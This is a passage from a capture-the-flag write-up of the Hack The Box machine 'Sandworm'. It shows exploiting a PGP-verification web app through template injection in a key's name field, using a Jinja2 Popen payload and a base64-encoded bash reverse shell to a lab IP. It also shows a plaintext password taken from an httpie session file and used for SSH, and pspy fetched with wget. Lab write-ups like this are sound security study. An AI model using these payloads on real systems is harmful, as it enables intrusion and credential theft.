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
HU4lBC2dJZaNUro=
=gEqd
-----END PGP PUBLIC KEY BLOCK-----
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ cat example.txt.asc 
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512


CURIOSITY LOVES HACKING THINGS!

-----BEGIN PGP SIGNATURE-----

iQHLBAEBCgA1FiEEMgxwpkb+778e2tVY/ppA3f/kwkkFAmVGU5sXHGN1cmlvc2l0
eUBoYWNrc2Zvci5mdW4ACgkQ/ppA3f/kwknesQv8DVaGrOL7sI7B375qHbzTyLu/
FpeujzCO+u85OPZT3/iyeg26EMs10q+QkHROx+7fK5nkAoN83fAfUSAqjgahYg0H
xMcbaj50JWxlrz/jhWuLlLK4RenpLszhtj2dQ3xNKAKPHRLTajgx4wwr8UxJB8yl
aOPVbSDvtLg8bToM2SJ/RLDR2B+MNWHd6KWNpfhJ1WvVtgCClNcayF5VkUCF0ahx
RWcE+r1ueqOp3/5Xj+fRFfq0yJQt0YyekOAt7F+ASNNJlXpLeLZFPVXe27JFVfI5
+crphfwjHtgu6QE2Nsp0QmKSQHjogeAOdfbpYfVn4Fg9cgdcdTFmo6jJdDsJ+Vn9
p5NxP7vRT8imbZEW8F5Sc8OmVx6uxr2IFyUrHDf52awCD24lSnDSGrhxxG+CxVYi
hgB/pZhaXAbXKPcDm8CX6XcLxQrikJJHMy2/d5tolJ/h2sw5mZnzRP7tVnmvVPV0
PYKISiZnASpx9wF1rGeqCbZdoKTXwj98rAqabBTg
=lpdp
-----END PGP SIGNATURE-----
```

![](/assets/images/writeups/sandworm/11.png)

- **Modify Payload**: We then crafted a payload that replaced the **Real name** parameter with the following code:

```shell
{ {''.__class__.__base__.__subclasses__()[439]('id', shell=True, stdout=-1).communicate()} }
```

This payload instructs the application to run the `id` command on the server using the `Popen` function.

```shell
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --gen-key                                                    
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: { {''.__class__.__base__.__subclasses__()[439]('id', shell=True, stdout=-1).communicate()} }
Email address: curiosity@hacksfor.fun
You selected this USER-ID:
    "{ {''.__class__.__base__.__subclasses__()[439]('id', shell=True, stdout=-1).communicate()} } <curiosity@hacksfor.fun>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: revocation certificate stored as '/home/kali/.gnupg/openpgp-revocs.d/6893F090D1B83FB46E552699F8E6CA0320DC7F83.rev'
public and secret key created and signed.

pub   rsa3072 2023-11-04 [SC] [expires: 2025-11-03]
      6893F090D1B83FB46E552699F8E6CA0320DC7F83
uid                      { {''.__class__.__base__.__subclasses__()[439]('id', shell=True, stdout=-1).communicate()} } <curiosity@hacksfor.fun>
sub   rsa3072 2023-11-04 [E] [expires: 2025-11-03]
```

- **Export Public Key and Sign Message**: After modifying the payload, we exported the public key and created a signed message using the manipulated key. This would ensure that our payload is executed when the signed message is processed by the server.

```shell
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --export --armor curiosity@hacksfor.fun > curiosity.pub      
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --clear-sign --default-key curiosity@hacksfor.fun example.txt
gpg: using "curiosity@hacksfor.fun" as default secret key for signing
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ cat curiosity.pub  
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQGNBGVGVLwBDAC42HwrzaxWzMoRVZW6IXEGBwRbLYojsC1JiTThLuu7p92QtvTC
567yT0n6CCJHgNXSpuL2OnNQ4ARVTLgax6S7FadWK8mcob8r/3u7U+ixzOgzArjo
Xe/9nbCbpTB1DGD1QJL+ebxPWtH8kstU+wfvh+AmuH8yylKZFyFYIC6TuUeQ6wNT
gfblvqNZiAl49uzpR7myiqWuAjPwCc4sowaKM449xt23ltHir8RUsLZmDSsVODpT
AFSXmwZwfrRBgLmoDUUE2+zlXtB3dcRVMrnfxODh7YW4nxkoqobTP6/ofJWDiqka
0UNbJzznKHcdGbnA8RbkumPttijDe18iXs1oj8Yp61FX3g0YUIhBvfdQZYKOOf1t
CY0F61OFwJQ9sVnNjYdaqcMb8fTX8Sin0SXnUKLGnGHz2Dw6iBbai9QHyI7uL7KF
hPzXDvP/aPTb7o38bHTLrwja2Aryde2Pi07/MvOUsKpp+F7w0f3nfhIl7U3gDNZc
Y3sOgdoGIvwPozMAEQEAAbRze3snJy5fX2NsYXNzX18uX19iYXNlX18uX19zdWJj
bGFzc2VzX18oKVs0MzldKCdpZCcsIHNoZWxsPVRydWUsIHN0ZG91dD0tMSkuY29t
bXVuaWNhdGUoKX19IDxjdXJpb3NpdHlAaGFja3Nmb3IuZnVuPokB1AQTAQoAPhYh
BGiT8JDRuD+0blUmmfjmygMg3H+DBQJlRlS8AhsDBQkDwmcABQsJCAcCBhUKCQgL
AgQWAgMBAh4BAheAAAoJEPjmygMg3H+Dnd0L/2haQ1TI9haG87ueZ1QdCeGLj5UD
ogumgBaOxWvVkoodTS+T4uUXVtnPkK5JEhypXkP7Ek6YnLjCK9BPInMWXpvV2fzs
3/rcC1FE9xO8FwDTw02IZksVr2OZ/xeyRoWMgj/UnL7ariimJ9h60BIkEfGev2H9
tefxmgmzBiNon4Hd3zgjv1lTtwIJKIsvb+Uu6VqUJ6aM9AxlsTw03CAINuBe/1hD
zv8IBnOrKBbopvBKYMjK5wGDXYziBPUT5wbbby6UyAiBVDnq3lKwIvM+F6fDSb1L
3seM5du7CRNnXM8zskKBp3DjDHNZcHZ6g/MSiWeUR9h14LgJbbvHDyVW6gWgrQ6l
VW/konwcMirK7kbjIn9FlhRh28LnY3gxKnKokvLRsNekZlqYmLvPG25ZTpnsaErI
S3TgzhVbI/82qNlhBCZ/ktaOEKwVCa0Ib9JIQLGuctiICYOIXiAQSyMw3+/JtfFv
wMqg3+PdrwS8gdbDhg8+Z76+/XR0YZB4c/T607kBjQRlRlS8AQwA20sEMJ4Uy25o
7slyJihOJ/N1ArXWpkAzLX5Zp5iCg58gUoEyyu2HCvkBTPO507lmGziGMMlUddcn
tG9vPuppfM5jHV9lTH3JZZ/XMr2IEtY/pEGKvZT3AJxIgTNDIUKBjP26QAb6rUNz
r5gSN99thYavNUJqUvlRZQK7MQrx7wzgqpciZx6w2vGnBAld7yADlo34AkgAtycG
rA5R4bfFBdXxf4YQ+KHkkj2XgkfcnGvf5P63I8eTjOMOnJtz4bBs9W7fQMejlCmf
Sbc0PMx1TRet/+i9+c4/VxCyF7YS/E7UDT6GanFn2yGCOcq6UInNdMBjF7RrdwaL
B1JUEs91qFV4WKl2X3yFfzppuTcKV5ZItCstHzY5hSKhpcbQ6VavNRZ2l+VE1YC4
lk4vkULuqfuuBvzSO9Ktw2fhQpTdJk8NyV8x+JqPeLMRlPS8zKro7+RxxOao53RY
EVYUzVvpWzZnr1OeGoJCXyjSUBHVdpivleNj+C7gHo3azrijjUJzABEBAAGJAbwE
GAEKACYWIQRok/CQ0bg/tG5VJpn45soDINx/gwUCZUZUvAIbDAUJA8JnAAAKCRD4
5soDINx/g3VsDAClMi0BFa9olsmPGSFS232+Zq9wztYm5HxXmx1qf9Y94WZvRNhx
rR5z3xgNs84mvadRQbMSbQopRtZAzQagHy1+dv7BjOgi5stuzGVmcTK9wTE8sjj3
yZ6Kje4Of1oggYOoLA/xoxcveeCRCP78SUZ7uto4moNEjGPQRpqjk0sq1Vx4fdUn
NMtgwlW+x+DReKZc1FF8A550zqLdgWdGpy2cgJdTgDfP6pOZigPtP29XztRU6rO0
pkmHalEM5wGhzm+wE0iUvk0UeQ0cc2hO6KahuOxqZ+X1bZWKTWztlckEfNcsiQJ3
/SIPr7/AJCj/L6M1puy+itWaX3tXE58YpGVgnzYI1AYa2nocftDwA6+/h5IKgvTT
dzH6Na8Qgf27mKN1Twaay7Ib+sTIaPe8xQEoBAMl/eLvKDnB6WnammznHzdZNGJ1
RpYDsz2cZ8NuGzJ4IPdprv+l+Kt5DWNS3ApH9Au49CiFppzcnZXx6OKJ0v9xO/YW
JdjWDecEn5bHBl8=
=eU2m
-----END PGP PUBLIC KEY BLOCK-----
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ 
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ cat example.txt.asc
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512


CURIOSITY LOVES HACKING THINGS!

-----BEGIN PGP SIGNATURE-----

iQHLBAEBCgA1FiEEaJPwkNG4P7RuVSaZ+ObKAyDcf4MFAmVGVQYXHGN1cmlvc2l0
eUBoYWNrc2Zvci5mdW4ACgkQ+ObKAyDcf4NhQAwAo/MlsCjyxmnHrxuafyicvzEB
uc1oqFhKJPDZAOZl/eqIELrVIjquKIvFRP9e7JaYrHJ+zpRyMijEQoUTN17MzPFh
YGLAmHKgOGpgbD/HQZ45XYZsFAMF0zRldvEf4Hxnw3ZSOuuYyO8YuGBJL8wRG0X8
nMbEx++c5PhY1TlRyaTcFJWXwd3t6ydXbzsu4lZavuyL6q6cE4hgbUHdlm1lBGhm
ER4UjZUefnl+AQzFV3CghPxJZFyxroTOnyBSgkH3K9z1DpMcqNzAgZTLfU3gG3Ta
iC+Z0mB6Z8N5nc/K65/u5v08nQ3DFcC2os2tA+25NrzyzosLWCCeCM2qxWNuLgqu
UzLpCK74wLpWtnQ2gBH3EEnNvG74GjUmEdJ1fBsUNI9qxDw3VxLXgaEkpJu5zjtB
0TlM8MxqjVLTJS4sJDlis3ba2cjRw2bPi3YGBYJXKWwfkdu19vonlCftcBigL4nb
Wns12Nckvc5ZJfy90nUHDb8lwZGv1cL979aukNXN
=5anV
-----END PGP SIGNATURE-----
```

- **Execute the Payload**: When the server processed the signed message, it executed the payload. In this case, the payload ran the `id` command on the server and returned the results.

![](/assets/images/writeups/sandworm/12.png)

- **Verification**: By observing the response from the server, we verified that we were successful in running the `id` command. This confirmed that we had successfully escalated the **Server-Side Template Injection** to **Remote Code Execution**.

# SANDBOXED SHELL AS ATLAS

We used a `bash` one-liner reverse shell and activated our `netcat` listener, allowing us to establish a connection to it.

```shell
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.75/443 0>&1"' | base64
YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43NS80NDMgMD4mMSIK
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ nc -nlvp 443
listening on [any] 443 ...
```

```shell
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --gen-key                                                    
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Note: Use "gpg --full-generate-key" for a full featured key generation dialog.

GnuPG needs to construct a user ID to identify your key.

Real name: { {''.__class__.__base__.__subclasses__()[439]('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43NS80NDMgMD4mMSIK | base64 -d | bash', shell=True, stdout=-1).communicate()} }
Email address: curiosity@hacksfor.fun
You selected this USER-ID:
    "{ {''.__class__.__base__.__subclasses__()[439]('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43NS80NDMgMD4mMSIK | base64 -d | bash', shell=True, stdout=-1).communicate()} } <curiosity@hacksfor.fun>"

Change (N)ame, (E)mail, or (O)kay/(Q)uit? O
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
We need to generate a lot of random bytes. It is a good idea to perform
some other action (type on the keyboard, move the mouse, utilize the
disks) during the prime generation; this gives the random number
generator a better chance to gain enough entropy.
gpg: revocation certificate stored as '/home/kali/.gnupg/openpgp-revocs.d/7A1F68F0ECE8286589EE7958BF01BC558ECA88D3.rev'
public and secret key created and signed.

pub   rsa3072 2023-11-04 [SC] [expires: 2025-11-03]
      7A1F68F0ECE8286589EE7958BF01BC558ECA88D3
uid                      { {''.__class__.__base__.__subclasses__()[439]('echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43NS80NDMgMD4mMSIK | base64 -d | bash', shell=True, stdout=-1).communicate()} } <curiosity@hacksfor.fun>
sub   rsa3072 2023-11-04 [E] [expires: 2025-11-03]

```

```shell
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --export --armor curiosity@hacksfor.fun > curiosity.pub      
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ gpg --clear-sign --default-key curiosity@hacksfor.fun example.txt
gpg: using "curiosity@hacksfor.fun" as default secret key for signing
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ cat curiosity.pub  
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQGNBGVGWqMBDADjTAvXs3Ko12ErWHnm/yy+XrEoGcnhbyvz4vRD+NGSHCpK66om
+kgF180uNgsGfw2KWIooBwDI0I3X8jFQWMUK1EyrvMc+/mjuGnrbUhvHvxBy5Axx
O74aMmPEWD8R/UbpwoQZh2CVCLT6nnrbM1GMRIFZe2ibucIK3N+R3vx5BBNSTK7e
hrSgjw4neUtk1uVEaQP/9K45AQfrEWVLdmnZHaS9/KKDKOgsycQ3zaNLVXbUkoxb
4+M1Ft5119Ypg4/0fupRa80fY4WpJT4bfFufd1AOLatfthXM88R8aF3qFzkE19GI
8JksxMB5cSfF8BESMVRpVvJ1tA/yEB/8aog7w3h5wJMB3OXHxD206egnJN6pIgka
NH9H8zKZG6X/uOEf6D8rWp6eXxLQmcOdweSS1pVZ7h2r1NwDHb2x9IxFooWsB2P0
uU4Oh88RSsyO46+CJ29dIcWxGAIpAyPquQLs78B4SYHoIVYfi+g2q6CtNhEcPo76
L1RvwbiX0KeFchEAEQEAAbTNe3snJy5fX2NsYXNzX18uX19iYXNlX18uX19zdWJj
bGFzc2VzX18oKVs0MzldKCdlY2hvIFltRnphQ0F0WXlBaVltRnphQ0F0YVNBK0pp
QXZaR1YyTDNSamNDOHhNQzR4TUM0eE5DNDNOUzgwTkRNZ01ENG1NU0lLIHwgYmFz
ZTY0IC1kIHwgYmFzaCcsIHNoZWxsPVRydWUsIHN0ZG91dD0tMSkuY29tbXVuaWNh
dGUoKX19IDxjdXJpb3NpdHlAaGFja3Nmb3IuZnVuPokB1AQTAQoAPhYhBHofaPDs
6Chlie55WL8BvFWOyojTBQJlRlqjAhsDBQkDwmcABQsJCAcCBhUKCQgLAgQWAgMB
Ah4BAheAAAoJEL8BvFWOyojT6GMMAMJrIhxK7PyF9tQNYOtqDbPBBnwXnadd9mu2
Rib3l6q77zKr0FBtHY3GRMOed7gep8sMT29ABeiaP1B3Erx6gpikXh0SziLGueO3
1AYrkA5YvEMA+eQR1YBJeYKUkzMVWFlnX3j84PKps96cOtZwrkmZ8Ht5ekSMmvcI
VJbt8hmrnrBPmwJyeL8CnvRXfdWM7VAzAucFU5rVQN4LtJKHRjHo1D2o85lu8Ytv
4RUZKNcm7T7or209xcVkTD9Uw4qG0NnIkkCXBNJiG5ie/D7coqwbIOpc89K785gm
lqzvItdnYhOHb5mzWwdTYa0EDkS0gZkub+H1u6dg3KrT5yXMQJrrqrm7JNkSNJtk
NAirv38YV9sB1G7rRl+hK4O5lwqvbBZIAg9Be/WOMQcYrmZ8MNE+TCU9uLt0xvLF
Vi6w0ywxOLwIYeN7VTtrIKTk5qeqXaIOYXxUx2jlCp2IllfK0oeWmGK88FqHb8DU
wDbPYEJXQEaRwCMcVJAooT8QN9qmu7kBjQRlRlqjAQwA2UNuNDKgJqa5oHUJs4VS
cpzSOhg4zNxAF46r/dPPzwTvEhdAfl2tOzsQezCkI6egsWyGx/xzG69sUxje5wCo
G5gLRIxZmNSJ5DUK0ng/dwZ3eSQLL+OOPCT6XZWiLPAwWQmiyNlMfU+/ErkFsAX2
YfVmKAKm2tCSbXoXtMSXI8LsUyheu8sVxkQKmU/L2lv/UamlKVAe1zjAvIeyi78m
XJG6EmXm458dHkAjiqXnymwy/dYXox9/hNJgUzWaJOypH2GqPQuPLBYeuRndWp8c
uyxHIJ19O5w8gOBe+85gBgdUtuDhtsivdkHNnUfCjcYmKyatuu1dGMxRVmrbHmQd
7R1jMO9LqRqfldsVbHh2Q9PKnRH1Hag6hbwVe1Ui8dXTVoQ+odt5IM7YiQkHjREs
rkHfgJpnht3IUyJHYufGpcFn9T1P5hpsQHIxlDtR5a9MortQbHp1/GsDk38bZKI7
7kvRi6frsjBzdnEZlXIRNraGMX+HnfiZ0KuO6mMrIRB9ABEBAAGJAbwEGAEKACYW
IQR6H2jw7OgoZYnueVi/AbxVjsqI0wUCZUZaowIbDAUJA8JnAAAKCRC/AbxVjsqI
0+dHC/4lamfT17hMrYy/sfFZtS27wmMhWK1OuZEQSr8vD3Ap1sRCMmiOlG8AT/yP
xcPNaxNM/d3Z/brYq2/h/Id3QQzBSX9ybZtb/Jf66zWl7Aw4nqwNlUAaOflZUq4C
oHEQgGKfwAXIeolj0xuK81tTKVTmfdgjr50NHsT+57vObz0GwZug8dHugQEb1Wbl
buLBJ7EGwAJ9BR31GqmrgYbNTO8sgMbyA9POW/9IAB4N4tgwUCmW2BrERe6LtiWI
G63EKqzFoNvsC6CVSibp2D1vES+7EfzsNtKfT/vGqqyIn9wzuXhXmvFgZcnPlbt+
dVTRKBIoh+UNuwpf+VUogLfwIqnSTj+1sIRf77UbQWpUivZkCvKDZP43LjgP6GMO
gu1BLflav6TNJ3IzUMwIk6Ijws+l60iESFCZDuFmzEaOZf+WTm5o0qJfTPXyVDQV
c5t0f9r8ZB8w81ZthCEmVhfAFa4kmvwzWJTSCvy4cI2H//EzYE/UGVOtIURs2Tae
fUHsoOo=
=0lkw
-----END PGP PUBLIC KEY BLOCK-----
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ cat example.txt.asc 
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512


CURIOSITY LOVES HACKING THINGS!

-----BEGIN PGP SIGNATURE-----

iQHLBAEBCgA1FiEEeh9o8OzoKGWJ7nlYvwG8VY7KiNMFAmVGWu8XHGN1cmlvc2l0
eUBoYWNrc2Zvci5mdW4ACgkQvwG8VY7KiNOy6QwAkOVTPmbLfdy7rOLcTZL9gkcP
LlRkAmpWYsXGikVNjWezFMGD06MfXD5E84fOFIn9i9xQmHRKA1Wlx1EHZArSCv6x
QVINZPtYmFX2ltzDGHLWSI7Vlg1w7SLOpt2x3uETrdcLVvkvhmHpMGuX6u0go7Fg
orGd+Te7H3VzRxyjlRW+fxvCs9gY6nsSbkUBMIzA2PQOnTgHiTVJoRBd36Y3dv/L
vGLmYJfryTxDukEdWUh3XS31RbIMj0YNVfsqfIBLFUaOAfQbz+T0uTHECT5otKhV
ahXOqToPSynasXm/Sv61xl322Xr4jEazuMr7gOxSm+3TVcY4+neOi1DJx1oXm4s6
g+uMAY+MuP3ydJPvJatrVYGDEITMDsUPguM2KTHQWSI3F46OaRfuE562uMIyxE9r
rQrvJal7ekIMsgtJvKyP/AsHtWeZybQMwRY+JZ7aglZv8NidiUnUUC4Ho7m6b5VZ
RE0K4LisEOIntgEoiGep4IvXLQnPJ2+80zQxat6M
=wWeN
-----END PGP SIGNATURE-----

```

```shell
┌──(kali㉿kali)-[~/pgp-tinkering]
└─$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.75] from (UNKNOWN) [10.10.11.218] 53416
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
/usr/local/sbin/lesspipe: 1: dirname: not found
atlas@sandworm:/var/www/html/SSA$ 
```

We got a shell back as `atlas`.

```shell
atlas@sandworm:/var/www/html/SSA$ sudo -l
Could not find command-not-found database. Run 'sudo apt update' to populate it.
sudo: command not found
atlas@sandworm:/var/www/html/SSA$ find / -type f -perm -4000 2>/dev/null
atlas@sandworm:/var/www/html/SSA$ cat /etc/passwd | grep root
Could not find command-not-found database. Run 'sudo apt update' to populate it.
grep: command not found
atlas@sandworm:/var/www/html/SSA$ cat /etc/passwd | more
Could not find command-not-found database. Run 'sudo apt update' to populate it.
more: command not found      
atlas@sandworm:/var/www/html/SSA$ cat /etc/passwd | less
Could not find command-not-found database. Run 'sudo apt update' to populate it.
less: command not found
atlas@sandworm:/var/www/html/SSA$ cat /etc/passwd | head
Could not find command-not-found database. Run 'sudo apt update' to populate it.
head: command not found
atlas@sandworm:/var/www/html/SSA$ 
```

We attempted to run various commands like `sudo -l`, `find`, `more`, `head` and `less` to discover system information. However, many essential utilities were missing or restricted, implying that we were operating within a confined, limited environment.

```shell
atlas@sandworm:~/.config$ ls -la
total 12
drwxrwxr-x 4 atlas  atlas   4096 Jan 15  2023 .
drwxr-xr-x 8 atlas  atlas   4096 Jun  7 13:44 ..
dr-------- 2 nobody nogroup   40 Nov  3 05:03 firejail
drwxrwxr-x 3 nobody atlas   4096 Jan 15  2023 httpie
```

Further inspection revealed a `firejail` directory within the `.config` directory, confirming that we were indeed within a sandboxed environment. 

`Firejail` is a `SUID` sandbox program designed to enhance security by restricting the environment in which untrusted applications can run, utilizing Linux `namespaces`, `seccomp-bpf`, and linux `capabilities`.

# BREAKING OUT OF SANDBOXED ENVIRONMENT

In our effort to break out of the restricted environment, we followed a series of steps:

- We found login details for a user named `silentobserver` in a configuration file located at `/home/atlas/.config/httpie/sessions/localhost_5000/admin.json`.

```shell
atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat admin.json 
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
```

- Using these credentials, we logged into the system as `silentobserver`.

```shell
┌──(kali㉿kali)-[~]
└─$ ssh silentobserver@ssa.htb
silentobserver@ssa.htb's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-73-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Nov  4 03:13:21 PM UTC 2023

  System load:           0.0
  Usage of /:            91.6% of 11.65GB
  Memory usage:          19%
  Swap usage:            0%
  Processes:             222
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.218
  IPv6 address for eth0: dead:beef::250:56ff:feb9:9dbf

  => / is using 91.6% of 11.65GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jun 12 12:03:09 2023 from 10.10.14.31
silentobserver@sandworm:~$ id; whoami
uid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver)
silentobserver
```

- After gaining access, we brought `pspy32` to the system using the `wget`. This tool helped us monitor processes that were running at specific intervals.

```shell
silentobserver@sandworm:/tmp/curiosity-hackthebox$ wget http://10.10.14.75/pspy32
--2023-11-04 15:15:43--  http://10.10.14.75/pspy32
Connecting to 10.10.14.75:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2940928 (2.8M) [application/octet-stream]
Saving to: ‘pspy32’

pspy32                                          100%[====================================================================================================>]   2.80M  86.6KB/s    in 23s     

2023-11-04 15:16:07 (123 KB/s) - ‘pspy32’ saved [2940928/2940928]

silentobserver@sandworm:/tmp/curiosity-hackthebox$ chmod +x pspy32
```

- By running `pspy32`, we discovered that the `root` user was periodically running a `Rust` program located in the `/opt/tipnet` directory while assuming the identity of the user `atlas`.

```shell
silentobserver@sandworm:/tmp/curiosity-hackthebox$ ./pspy32 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
